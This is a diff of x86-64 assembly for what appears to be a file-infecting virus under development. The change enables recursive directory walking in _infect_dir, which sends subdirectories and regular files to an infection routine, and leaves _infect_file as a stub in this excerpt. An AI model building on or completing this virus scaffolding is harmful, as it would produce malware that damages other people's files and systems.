@@ -25,7 +25,7 @@ _start:
 
 newline db `\n`, 0x0
 
-_print:; (string rdi) - use rdi, rsi, rdx, rax, rbx(temp)
+_print:; (string rdi)
 	push rdx
 	push rbx
 	push rsi
@@ -90,6 +90,10 @@ _inject:
 	jmp _host
 
 _infect_dir:; (string rdi)
+	push r10
+	push r11
+	push r12
+	push rdx
 	push rcx
 
 	%ifdef DEBUG
@@ -106,12 +110,11 @@ _infect_dir:; (string rdi)
 	push rdi
 	pop r10; path
 	push rax
-	pop r13; fd
+	pop r11; fd
 
-	push r12
 	sub rsp, 1024
 	.getdents:
-		mov rdi, r13
+		mov rdi, r11
 		push 78
 		pop rax; getdents
 		push 1024
@@ -133,9 +136,6 @@ _infect_dir:; (string rdi)
 		add rdi, rcx; r12 => linux_dir
 		; if not . .. +18
 		add rdi, 18; linux_dir->d_name
-		%ifdef DEBUG
-			call _print; _print(rdi)
-		%endif
 		
 		; ft_strcmp with '.' and '..' to not infect_dir with them
 		push rcx
@@ -155,10 +155,6 @@ _infect_dir:; (string rdi)
 			cmp byte[rsi + rcx], 0x0
 			jnz .loop_array_string
 
-			%ifdef DEBUG
-				call _print; _print(rdi)
-			%endif
-
 		; concat_path
 			push rbx
 			sub rsp, 4096
@@ -176,10 +172,6 @@ _infect_dir:; (string rdi)
 			call _ft_strcpy
 			mov rdi, rsp
 
-			%ifdef DEBUG
-				call _print; _print(rdi)
-			%endif
-
 		; check infect_dir or infect_file
 			sub rsp, 600
 
@@ -190,25 +182,23 @@ _infect_dir:; (string rdi)
 			cmp rax, 0x0
 			jne .free_buffers
 
-			mov eax, [rsi + 24]; statbuf.st_mode
-			and eax, 0o0170000
-;			cmp eax, 0o0040000
-;			je .infect_dir
-			cmp eax, 0o0100000
+			mov rax, [rsi + 24]
+			and rax, 0o0170000
+			cmp rax, 0o0040000
+			je .infect_dir
+			cmp rax, 0o0100000
 			je .infect_file
-			add rsp, 600
 			jmp .free_buffers
 
 		.infect_dir:
 			call _infect_dir
-			add rsp, 600
 			jmp .free_buffers
 
 		.infect_file:
 			call _infect_file
-			add rsp, 600
 
 		.free_buffers:
+			add rsp, 600
 			add rsp, 4096
 			pop rbx
 
@@ -226,19 +216,24 @@ _infect_dir:; (string rdi)
 		push 3
 		pop rax; close
 		syscall
-
 		push r10
 		pop rdi
 
 	.return:
-		push rdi
-		pop rsi
 		add rsp, 1024
-		pop r12
+
 		pop rcx
+		pop rdx
+		pop r12
+		pop r11
+		pop r10
 ret
 
 _infect_file:
+	%ifdef DEBUG
+		call _print; _print(rdi)
+	%endif
+	xor rax, rax
 ret
 
 _host:
@@ -251,8 +246,6 @@ _host:
 _infected:
 	jmp _exit
 
-	push rdx
-	push rdx
 _exit:
 	pop rdx
 	pop r13
